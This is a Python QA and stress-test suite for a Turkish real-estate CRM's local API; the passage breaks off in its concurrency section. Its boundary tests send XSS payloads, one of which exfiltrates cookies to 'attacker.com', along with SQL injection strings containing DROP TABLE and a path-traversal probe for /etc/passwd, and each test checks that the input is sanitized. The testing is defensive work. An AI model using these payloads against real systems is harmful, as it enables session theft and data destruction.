"""
=============================================================================
NEXA CRM Live Stress Testing, Endpoint Audits & Data Integrity Test Suite
=============================================================================
Principal QA & Systems Resilience Engineering Audit Script
Target: http://127.0.0.1:5000
Covers:
  - CRM REST Endpoints: /api/crm/export/xlsx, /api/portfolio/all_buyers,
    /api/portfolio/listing/<ref_id>/buyer, /api/portfolio/listing/<ref_id>/dashboard,
    /api/portfolio/listing/<ref_id>/platform_stats, /api/portfolio/listing/<ref_id>/timeline,
    /api/lead/stages, /api/lead/report, /api/lead/state, /api/lead/events,
    /api/lead/capture, /api/appointments
  - Edge Cases: Turkish characters, empty strings, massive payloads, malformed numbers,
    currency symbols (₺), SQL injection payloads, XSS payloads
  - Concurrency Stress: 10-20 rapid concurrent requests testing race conditions in
    SQLite (data/intelligence.db) and JSON (static/data/portfolio_listing_dashboards.json)
  - Database & Data Integrity Checks: SQLite PRAGMA checks, table counts, JSON format
  - Performance Metrics: Latency tracking (min, max, avg, p95)
=============================================================================
"""

import io
import json
import os
import re
import sqlite3
import sys
import time

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import openpyxl
import requests

BASE_URL = "http://127.0.0.1:5000"
SQLITE_DB_PATH = os.path.join("data", "intelligence.db")
JSON_DASHBOARD_PATH = os.path.join("static", "data", "portfolio_listing_dashboards.json")

# Global test tracking
test_results = []
endpoint_latencies = {}


def record_result(category, name, passed, latency_ms=0, details="", severity="NORMAL"):
    test_results.append({
        "category": category,
        "name": name,
        "passed": passed,
        "latency_ms": round(latency_ms, 2),
        "details": details,
        "severity": severity
    })
    status = "PASS" if passed else "FAIL"
    symbol = "✅" if passed else "❌"
    print(f"[{status:4s}] {symbol} {category:18s} | {name:50s} | {latency_ms:7.2f}ms | {details}")


def track_latency(endpoint, latency_ms):
    if endpoint not in endpoint_latencies:
        endpoint_latencies[endpoint] = []
    endpoint_latencies[endpoint].append(latency_ms)


# =============================================================================
# SUITE 1: REST ENDPOINTS ROBUSTNESS
# =============================================================================
def run_suite_rest_endpoints():
    print("\n" + "=" * 80)
    print(">>> SUITE 1: REST ENDPOINT ROBUSTNESS AUDIT")
    print("=" * 80)

    # 1.1 GET /api/crm/export/xlsx
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/crm/export/xlsx", timeout=15)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/crm/export/xlsx", lat)
        
        is_ok = r.status_code == 200
        content_type = r.headers.get("Content-Type", "")
        has_xlsx_mime = "openxmlformats" in content_type or "spreadsheet" in content_type
        disp = r.headers.get("Content-Disposition", "")
        has_filename = "NEXA_CRM_Musteri_Yedek_" in disp
        
        # Verify valid Excel binary structure
        wb = openpyxl.load_workbook(io.BytesIO(r.content), data_only=True)
        expected_sheets = [
            "📊 Özet & İstatistikler",
            "🎯 Alıcılar & Teklifler",
            "🏢 Satıcılar & Portföyler",
            "👥 Tüm Kişiler Veritabanı",
            "🛰️ Web Leadleri"
        ]
        has_all_sheets = all(s in wb.sheetnames for s in expected_sheets)
        
        passed = is_ok and has_xlsx_mime and has_filename and has_all_sheets
        record_result(
            "REST: Export",
            "GET /api/crm/export/xlsx valid 5-sheet workbook",
            passed,
            lat,
            f"HTTP {r.status_code}, Sheets: {len(wb.sheetnames)}, Size: {len(r.content)} bytes"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Export", "GET /api/crm/export/xlsx valid workbook", False, lat, str(e), "HIGH")

    # 1.2 POST /api/crm/export/xlsx (Custom state payload)
    t0 = time.perf_counter()
    try:
        custom_payload = {
            "contacts": [
                {
                    "id": "audit_c_1",
                    "name": "Şükrü Çankayalı (Alıcı)",
                    "phone": "+90 532 999 00 11",
                    "email": "sukru@ornek.com",
                    "category": "buyer",
                    "role": "buyer",
                    "stage": "offer",
                    "stageName": "Teklif Verildi",
                    "price": 18500000,
                    "offer": "18.500.000 ₺",
                    "listingTitle": "Çankaya Gaziosmanpaşa 4+1 Dubleks",
                    "notes": "Öveçler ve İncek seçeneklerini de değerlendiriyor."
                },
                {
                    "id": "audit_c_2",
                    "name": "Gülseren Öztürk (Satıcı)",
                    "phone": "+90 542 888 22 33",
                    "email": "gulseren@ornek.com",
                    "category": "seller",
                    "role": "seller",
                    "stage": "listing",
                    "stageName": "Portföy Alındı",
                    "price": 25000000,
                    "offer": "25.000.000 ₺",
                    "listingTitle": "Ümitköy Müstakil Villa",
                    "notes": "Yetki belgesi alındı."
                }
            ],
            "webLeads": [
                {
                    "id": "audit_lead_1",
                    "name": "Banu Aydın",
                    "phone": "+90 555 777 66 55",
                    "neighborhood": "İncek",
                    "property_type": "Villa",
                    "status": "new_lead",
                    "createdAt": "2026-11-01 10:00"
                }
            ]
        }
        r = requests.post(f"{BASE_URL}/api/crm/export/xlsx", json=custom_payload, timeout=15)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/crm/export/xlsx", lat)
        
        is_ok = r.status_code == 200
        wb = openpyxl.load_workbook(io.BytesIO(r.content), data_only=True)
        all_text = " ".join([str(c) for sheet in wb.worksheets for row in sheet.iter_rows(values_only=True) for c in row if c])
        has_custom = "Şükrü" in all_text and "Gülseren" in all_text and "Banu" in all_text
        
        passed = is_ok and has_custom
        record_result(
            "REST: Export",
            "POST /api/crm/export/xlsx custom state with Turkish chars",
            passed,
            lat,
            f"HTTP {r.status_code}, Found custom contacts: {has_custom}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Export", "POST /api/crm/export/xlsx custom state", False, lat, str(e), "HIGH")

    # 1.3 GET /api/portfolio/all_buyers
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/portfolio/all_buyers", timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/portfolio/all_buyers", lat)
        
        is_ok = r.status_code == 200
        data = r.json()
        has_buyers = data.get("ok") is True and isinstance(data.get("buyers"), list)
        count = data.get("count", 0)
        
        passed = is_ok and has_buyers
        record_result(
            "REST: Portfolio",
            "GET /api/portfolio/all_buyers",
            passed,
            lat,
            f"HTTP {r.status_code}, ok: {data.get('ok')}, Total buyers in pool: {count}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Portfolio", "GET /api/portfolio/all_buyers", False, lat, str(e), "HIGH")

    # 1.4 GET /api/portfolio/listing/<ref_id>/dashboard
    test_ref = "test_audit_listing_101"
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/portfolio/listing/{test_ref}/dashboard", timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/portfolio/listing/<ref>/dashboard", lat)
        
        is_ok = r.status_code == 200
        data = r.json()
        dashboard = data.get("data", {})
        has_platforms = "platform_stats" in dashboard and len(dashboard["platform_stats"]) >= 6
        has_buyers = "buyers" in dashboard
        has_timeline = "timeline" in dashboard
        
        passed = is_ok and data.get("ok") is True and has_platforms and has_buyers and has_timeline
        record_result(
            "REST: Portfolio",
            "GET /api/portfolio/listing/<ref_id>/dashboard (auto-init)",
            passed,
            lat,
            f"HTTP {r.status_code}, refId: {dashboard.get('refId')}, platforms: {len(dashboard.get('platform_stats', []))}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Portfolio", "GET /api/portfolio/listing/<ref>/dashboard", False, lat, str(e), "HIGH")

    # 1.5 POST /api/portfolio/listing/<ref_id>/platform_stats
    t0 = time.perf_counter()
    try:
        stats_payload = {
            "platform_stats": [
                {"platform": "SAHIBINDEN", "logo": "🟡", "views": 1500, "favorites": 45, "messages": 12, "calls": 8, "influence": 90},
                {"platform": "HEPSIEMLAK", "logo": "🔴", "views": 800, "favorites": 20, "messages": 5, "calls": 3, "influence": 70},
                {"platform": "EMLAKJET", "logo": "🟣", "views": 400, "favorites": 10, "messages": 2, "calls": 1, "influence": 50},
                {"platform": "COLDWELL BANKER", "logo": "🔵", "views": 950, "favorites": 30, "messages": 15, "calls": 10, "influence": 95},
                {"platform": "BRANDA / AFİŞ", "logo": "🟠", "views": 300, "favorites": 0, "messages": 0, "calls": 5, "influence": 40},
                {"platform": "SOSYAL MEDYA & AD", "logo": "🟢", "views": 4200, "favorites": 120, "messages": 25, "calls": 14, "influence": 85}
            ]
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/platform_stats", json=stats_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/platform_stats", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True and len(data.get("platform_stats", [])) == 6
        # Verify score calculation formula: (v*1) + (f*5) + (m*15) + (c*25) + (inf*20)
        # For SAHIBINDEN: 1500*1 + 45*5 + 12*15 + 8*25 + 90*20 = 1500 + 225 + 180 + 200 + 1800 = 3905
        sahibinden_score = data.get("platform_stats", [{}])[0].get("score")
        score_verified = sahibinden_score == 3905
        
        record_result(
            "REST: Portfolio",
            "POST /api/portfolio/listing/<ref_id>/platform_stats score matrix",
            passed and score_verified,
            lat,
            f"HTTP {r.status_code}, Sahibinden Score calculated: {sahibinden_score} (Expected 3905)"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Portfolio", "POST platform_stats", False, lat, str(e), "HIGH")

    # 1.6 POST /api/portfolio/listing/<ref_id>/timeline
    t0 = time.perf_counter()
    try:
        timeline_payload = {
            "type": "showing",
            "title": "Müşteri Yer Gösterme Ziyareti Gerçekleşti",
            "note": "İncek bölgesindeki yatırımcı ile villa yerinde incelendi. Bahçe peyzajı beğenildi."
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/timeline", json=timeline_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/timeline", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True and "timeline" in data
        record_result(
            "REST: Portfolio",
            "POST /api/portfolio/listing/<ref_id>/timeline event addition",
            passed,
            lat,
            f"HTTP {r.status_code}, Total timeline events: {len(data.get('timeline', []))}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Portfolio", "POST timeline", False, lat, str(e), "HIGH")

    # 1.7 GET /api/lead/stages
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/lead/stages", timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/lead/stages", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True and len(data.get("stages", [])) > 0
        record_result(
            "REST: Lead",
            "GET /api/lead/stages",
            passed,
            lat,
            f"HTTP {r.status_code}, Stages: {data.get('stages')}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "GET /api/lead/stages", False, lat, str(e), "NORMAL")

    # 1.8 POST /api/lead/report
    t0 = time.perf_counter()
    try:
        report_payload = {
            "leadId": f"lead_audit_{int(time.time())}",
            "name": "Audit Test Kullanıcısı",
            "phone": "+90 532 000 11 22",
            "email": "audit@ornek.com",
            "neighborhood": "Çankaya Alacaatlı",
            "property_type": "Villa",
            "rooms": "5+2",
            "area": "450 m²",
            "notes": "Otomasyon stress testi değerleme talebi."
        }
        r = requests.post(f"{BASE_URL}/api/lead/report", json=report_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/lead/report", lat)
        
        # /api/lead/report may succeed or report notification errors depending on external API keys (Telegram/WhatsApp Cloud)
        # But it should return valid JSON without crashing with 500
        data = r.json() if r.headers.get("Content-Type", "").startswith("application/json") else {}
        is_handled = r.status_code in [200, 400]
        record_result(
            "REST: Lead",
            "POST /api/lead/report (Değerleme & Bildirim)",
            is_handled,
            lat,
            f"HTTP {r.status_code}, ok: {data.get('ok')}, channels: {list(data.get('channels', {}).keys())}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/lead/report", False, lat, str(e), "NORMAL")

    # 1.9 POST /api/appointments
    t0 = time.perf_counter()
    try:
        appt_payload = {
            "name": "Prof. Dr. Kemal İncek",
            "phone": "+90 533 111 22 33",
            "project_name": "Beytepe Zirve Villaları",
            "note": "Hafta sonu yer gösterimi için randevu."
        }
        r = requests.post(f"{BASE_URL}/api/appointments", json=appt_payload, timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/appointments", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("success") is True
        record_result(
            "REST: Lead",
            "POST /api/appointments (Randevu Talebi)",
            passed,
            lat,
            f"HTTP {r.status_code}, Appt ID: {data.get('id')}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/appointments", False, lat, str(e), "NORMAL")

    # 1.10 Lead Capture Endpoint: GET /api/lead/capture
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/lead/capture", timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/lead/capture", lat)
        data = r.json() if r.status_code == 200 else {}
        passed = r.status_code == 200 and data.get("ok") is True
        record_result(
            "REST: Lead",
            "GET /api/lead/capture health status",
            passed,
            lat,
            f"HTTP {r.status_code}, status: {data.get('status')}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "GET /api/lead/capture", False, lat, str(e), "HIGH")

    # 1.11 Lead Capture Endpoint: POST /api/lead/capture with Turkish chars & dual persistence
    t0 = time.perf_counter()
    try:
        lead_capture_payload = {
            "name": "Şebnem Öztürk (Web Lead)",
            "phone": "+90 532 777 88 99",
            "email": "sebnem@ornek.com",
            "project": "Çankaya Vadi Konakları",
            "notes": "İncek ve Beytepe projeleri hakkında bilgi talebi.",
            "source": "web_landing_form"
        }
        r = requests.post(f"{BASE_URL}/api/lead/capture", json=lead_capture_payload, timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/lead/capture", lat)
        
        data = r.json() if r.status_code == 200 else {}
        lead_id = data.get("leadId")
        passed = r.status_code == 200 and data.get("ok") is True and lead_id is not None
        
        # Verify persistence in SQLite table web_leads
        conn = sqlite3.connect(SQLITE_DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT id, name, phone, project FROM web_leads WHERE id = ?", (lead_id,))
        row = cur.fetchone()
        conn.close()
        sql_verified = row is not None and "Şebnem" in row[1]

        record_result(
            "REST: Lead",
            "POST /api/lead/capture & SQLite web_leads persistence",
            passed and sql_verified,
            lat,
            f"HTTP {r.status_code}, Lead ID: {lead_id}, SQLite Persisted: {sql_verified}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/lead/capture", False, lat, str(e), "HIGH")

    # 1.12 Lead Capture Alias: POST /api/lead (used in site.html)
    t0 = time.perf_counter()
    try:
        site_lead_payload = {
            "name": "Barış Çelik (Site Vitrin Lead)",
            "phone": "+90 533 222 33 44",
            "project": "İncek Loft Özel Villa",
            "project_id": "proj_incek_01",
            "notes": "Randevu saati: 14:00",
            "source": "site_showcase_modal"
        }
        r = requests.post(f"{BASE_URL}/api/lead", json=site_lead_payload, timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/lead", lat)
        
        data = r.json() if r.status_code == 200 else {}
        passed = r.status_code == 200 and data.get("ok") is True and "leadId" in data
        record_result(
            "REST: Lead",
            "POST /api/lead (site.html modal showcase alias)",
            passed,
            lat,
            f"HTTP {r.status_code}, Lead ID: {data.get('leadId')}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/lead", False, lat, str(e), "HIGH")

    # 1.13 Lead Capture Boundary: Empty Lead Payload Rejected
    t0 = time.perf_counter()
    try:
        r = requests.post(f"{BASE_URL}/api/lead/capture", json={}, timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/lead/capture (empty)", lat)
        
        is_400 = r.status_code == 400
        data = r.json()
        passed = is_400 and data.get("ok") is False
        record_result(
            "REST: Lead",
            "POST /api/lead/capture empty payload rejection (HTTP 400)",
            passed,
            lat,
            f"HTTP {r.status_code}, Error: '{data.get('error')}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/lead/capture empty", False, lat, str(e), "NORMAL")

    # 1.14 Lead State: Boundary & Validation (POST /api/lead/state)
    t0 = time.perf_counter()
    try:
        # Test missing leadId / newStage
        r = requests.post(f"{BASE_URL}/api/lead/state", json={"leadId": "test"}, timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/lead/state (missing params)", lat)
        is_handled = r.status_code == 400
        data = r.json()
        record_result(
            "REST: Lead",
            "POST /api/lead/state missing parameter rejection (HTTP 400)",
            is_handled,
            lat,
            f"HTTP {r.status_code}, Error: '{data.get('error')}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "POST /api/lead/state missing params", False, lat, str(e), "NORMAL")

    # 1.15 Lead Events: Timeline Query (GET /api/lead/events/<lead_id>)
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{BASE_URL}/api/lead/events/non_existent_lead_999", timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/lead/events/<id>", lat)
        # Should return 200 with empty list [] or 503 if Firebase unavailable, but never unhandled 500
        is_handled = r.status_code in [200, 503]
        record_result(
            "REST: Lead",
            "GET /api/lead/events/<lead_id> graceful handling",
            is_handled,
            lat,
            f"HTTP {r.status_code}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("REST: Lead", "GET /api/lead/events/<id>", False, lat, str(e), "NORMAL")


# =============================================================================
# SUITE 2: BOUNDARY TESTING, MALFORMED DATA & SPECIAL CHARACTERS
# =============================================================================
def run_suite_boundary_and_fuzzing():
    print("\n" + "=" * 80)
    print(">>> SUITE 2: BOUNDARY TESTING, FUZZING & INJECTION AUDIT")
    print("=" * 80)

    test_ref = "audit_boundary_listing_202"

    # 2.1 Turkish Special Characters & Symbols in Buyer Form
    turkish_payload = {
        "name": "Ömer Şafak Çelik (İncek & Ümitköy Adayı)",
        "phone": "+90 (532) 123-4567",
        "offer": "19.750.000 ₺",
        "stage": "Pazarlık Aşaması (Şentepe & Çankaya)",
        "note": "Türkçe harfler: ç, ğ, ı, ö, ş, ü / Ç, Ğ, İ, Ö, Ş, Ü. Özel simgeler: ₺, €, $, @, %, &, +, #",
        "listing_title": "ÇANKAYA GAZİOSMANPAŞA KÖŞE BAŞI VİLLA",
        "uid": "RnHhsj3K4VSWRY4cjc3Pc09JMFn2"
    }
    t0 = time.perf_counter()
    try:
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=turkish_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True
        buyer = data.get("buyer", {})
        
        # Verify characters were preserved without mojibake
        preserved = (
            "Ömer Şafak Çelik" in buyer.get("name", "") and
            "19.750.000 ₺" in buyer.get("offer", "") and
            "ç, ğ, ı, ö, ş, ü" in buyer.get("note", "")
        )
        record_result(
            "Boundary: Turkish",
            "Turkish characters (ç, ğ, ı, ö, ş, ü) & currency symbols (₺)",
            passed and preserved,
            lat,
            f"HTTP {r.status_code}, Name: '{buyer.get('name')}', Offer: '{buyer.get('offer')}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Turkish", "Turkish characters test", False, lat, str(e), "HIGH")

    # 2.2 Empty Strings & Completely Missing Fields (Negative Validation)
    t0 = time.perf_counter()
    try:
        empty_payload = {
            "name": "",
            "phone": "",
            "offer": "",
            "note": "",
            "listing_title": ""
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=empty_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer (empty)", lat)
        
        # Expected: 400 Bad Request ("Alıcı adı veya teklif tutarı zorunludur.")
        is_400 = r.status_code == 400
        data = r.json()
        has_error_msg = "zorunludur" in data.get("error", "").lower() or "error" in data
        
        passed = is_400 and has_error_msg
        record_result(
            "Boundary: Validation",
            "Reject completely empty payload with HTTP 400",
            passed,
            lat,
            f"HTTP {r.status_code}, Response error: '{data.get('error')}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Validation", "Reject empty payload", False, lat, str(e), "NORMAL")

    # 2.3 Buyer with Missing Phone (Should succeed with default '-')
    t0 = time.perf_counter()
    try:
        no_phone_payload = {
            "name": "Telefon Vermeyen Gizli Yatırımcı",
            "phone": "",
            "offer": "35.000.000 ₺",
            "stage": "Gizli Teklif",
            "note": "Sadece e-posta ve temsilci üzerinden iletişim."
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=no_phone_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer (no phone)", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True
        buyer = data.get("buyer", {})
        phone_handled = buyer.get("phone") == "-"
        
        record_result(
            "Boundary: Optional",
            "Empty phone number safely defaults to '-'",
            passed and phone_handled,
            lat,
            f"HTTP {r.status_code}, Assigned phone: '{buyer.get('phone')}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Optional", "Empty phone default", False, lat, str(e), "NORMAL")

    # 2.4 Extreme Values: 0 TL, Massive Numbers, Negative Numbers
    extreme_cases = [
        {"desc": "0 TL Zero Offer", "offer": "0 ₺", "expected_code": 200},
        {"desc": "Negative Offer (-5.000.000 ₺)", "offer": "-5.000.000 ₺", "expected_code": 200},
        {"desc": "Massive Offer (999.999.999.999 ₺)", "offer": "999.999.999.999 ₺", "expected_code": 200},
        {"desc": "Non-numeric String Offer ('Kat Karşılığı & Takas')", "offer": "Kat Karşılığı & Takas", "expected_code": 200}
    ]
    for ec in extreme_cases:
        t0 = time.perf_counter()
        try:
            p = {
                "name": f"Extreme Tester ({ec['desc']})",
                "phone": "+90 532 111 22 33",
                "offer": ec["offer"],
                "stage": "Teklif Testi",
                "note": f"Extreme test case: {ec['desc']}"
            }
            r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=p, timeout=10)
            lat = (time.perf_counter() - t0) * 1000
            track_latency("POST /api/portfolio/listing/<ref>/buyer (extreme)", lat)
            
            data = r.json()
            passed = r.status_code == ec["expected_code"] and data.get("ok") is True
            record_result(
                "Boundary: Extreme",
                f"Extreme offer handling: {ec['desc']}",
                passed,
                lat,
                f"HTTP {r.status_code}, Offer saved: '{data.get('buyer', {}).get('offer')}'"
            )
        except Exception as e:
            lat = (time.perf_counter() - t0) * 1000
            record_result("Boundary: Extreme", f"Extreme offer {ec['desc']}", False, lat, str(e), "HIGH")

    # 2.5 XSS / HTML Injection Payloads
    t0 = time.perf_counter()
    try:
        xss_payload = {
            "name": "<script>alert('XSS_ATTACK_NAME')</script>",
            "phone": "\"><svg onload=alert('XSS_PHONE')>",
            "offer": "15.000.000 ₺<iframe src='javascript:alert(1)'>",
            "stage": "Yeni Talep<img src=x onerror=alert('XSS_STAGE')>",
            "note": "XSS Note: <script>document.location='http://attacker.com?c='+document.cookie</script>"
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=xss_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer (xss)", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True
        buyer = data.get("buyer", {})
        
        # Verify HTML escaping: raw '<' must be converted to '&lt;' or stripped
        is_name_escaped = "<script>" not in buyer.get("name", "") and "&lt;script&gt;" in buyer.get("name", "")
        is_note_escaped = "<script>" not in buyer.get("note", "") and "&lt;script&gt;" in buyer.get("note", "")
        escaped_cleanly = is_name_escaped and is_note_escaped
        
        record_result(
            "Boundary: Security",
            "XSS & HTML tag injection escaping (html.escape)",
            passed and escaped_cleanly,
            lat,
            f"Escaped Name: '{buyer.get('name')}', Escaped Note snippet: '{buyer.get('note')[:30]}...'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Security", "XSS injection escaping", False, lat, str(e), "HIGH")

    # 2.6 SQL Injection Attempts
    t0 = time.perf_counter()
    try:
        sqli_payload = {
            "name": "SQLi Test' OR '1'='1' --",
            "phone": "+90 532 999 00 00'; DROP TABLE portfolio_listing_buyers; --",
            "offer": "10.000.000 ₺' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
            "stage": "Pazarlık' OR 1=1 --",
            "note": "SQL Injection probe payload testing parameterized SQLite safety."
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=sqli_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer (sqli)", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True
        
        # Verify table still exists in SQLite!
        conn = sqlite3.connect(SQLITE_DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='portfolio_listing_buyers'")
        table_exists = cur.fetchone()[0] == 1
        conn.close()
        
        record_result(
            "Boundary: Security",
            "SQL Injection resilience (parameterized queries intact)",
            passed and table_exists,
            lat,
            f"HTTP {r.status_code}, SQLite table portfolio_listing_buyers exists: {table_exists}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Security", "SQL Injection resilience", False, lat, str(e), "HIGH")

    # 2.7 Massive Payload (50 KB string) Buffer Test
    t0 = time.perf_counter()
    try:
        massive_text = "NEXA_STRESS_AUDIT_DATA_" * 2500  # ~57 KB
        massive_payload = {
            "name": "Massive Payload Buyer " + "A" * 500,
            "phone": "+90 532 000 00 00",
            "offer": "50.000.000 ₺",
            "stage": "Büyük Veri",
            "note": massive_text
        }
        r = requests.post(f"{BASE_URL}/api/portfolio/listing/{test_ref}/buyer", json=massive_payload, timeout=10)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("POST /api/portfolio/listing/<ref>/buyer (massive)", lat)
        
        data = r.json()
        passed = r.status_code == 200 and data.get("ok") is True
        # Check truncation limits: note is sliced to 1000 chars, name to 100 chars
        buyer = data.get("buyer", {})
        is_name_capped = len(buyer.get("name", "")) <= 100
        is_note_capped = len(buyer.get("note", "")) <= 1000
        
        record_result(
            "Boundary: Buffer",
            "Massive payload 50KB input truncation & memory protection",
            passed and is_name_capped and is_note_capped,
            lat,
            f"HTTP {r.status_code}, Name len: {len(buyer.get('name', ''))} (max 100), Note len: {len(buyer.get('note', ''))} (max 1000)"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Buffer", "Massive payload buffer test", False, lat, str(e), "HIGH")

    # 2.8 Path Traversal in ref_id
    t0 = time.perf_counter()
    try:
        malicious_ref = "../../../etc/passwd"
        r = requests.get(f"{BASE_URL}/api/portfolio/listing/{malicious_ref}/dashboard", timeout=5)
        lat = (time.perf_counter() - t0) * 1000
        track_latency("GET /api/portfolio/listing/<malicious_ref>/dashboard", lat)
        
        # The endpoint sanitizes ref_id using regex re.sub(r'[^a-zA-Z0-9_\-\.:]', '_', ref_id)
        # Verify it doesn't leak filesystem or throw 500
        is_handled = r.status_code in [200, 400, 404]
        data = r.json() if r.headers.get("Content-Type", "").startswith("application/json") else {}
        sanitized_ref = data.get("data", {}).get("refId", "")
        no_dot_dot = ".." not in sanitized_ref and "/" not in sanitized_ref
        
        record_result(
            "Boundary: Path Traversal",
            "Path traversal sanitization (re.sub on ref_id)",
            is_handled and no_dot_dot,
            lat,
            f"HTTP {r.status_code}, Sanitized refId: '{sanitized_ref}'"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Boundary: Path Traversal", "Path traversal in ref_id", False, lat, str(e), "HIGH")


# =============================================================================
# SUITE 3: RAPID CONCURRENT REQUESTS (STRESS & RACE CONDITION AUDIT)
# =============================================================================
def run_suite_concurrency_stress():
    print("\n" + "=" * 80)
    print(">>> SUITE 3: RAPID CONCURRENT REQUESTS & RACE CONDITION STRESS AUDIT")
    print("=" * 80)

    concurrency_ref = f"audit_concurrency_listing_{int(time.time())}"
    num_requests = 20
    print(f"[*] Launching {num_requests} rapid concurrent POST buyer requests against ref_id: '{concurrency_ref}'...")

    def send_single_buyer(index):
        payload = {
            "name": f"Eşzamanlı Alıcı #{index:02d} (Kemal Koç)",
            "phone": f"+90 532 999 {index:02d} {index:02d}",
            "offer": f"{10_000_000 + (index * 250_000):,} ₺".replace(",", "."),
            "stage": "Pazarlık Aşaması",
            "note": f"Eşzamanlı stres testi alıcısı index {index} timestamp {time.time()}",
            "listing_title": "BEYTEPE REZİDANS 4+1 KULE DAİRE"
        }
        t_start = time.perf_counter()
        try:
            resp = requests.post(
                f"{BASE_URL}/api/portfolio/listing/{concurrency_ref}/buyer",
                json=payload,
                timeout=12
            )
            lat = (time.perf_counter() - t_start) * 1000
            return {
                "index": index,
                "status_code": resp.status_code,
                "ok": resp.json().get("ok") if resp.status_code == 200 else False,
                "buyer": resp.json().get("buyer") if resp.status_code == 200 else None,
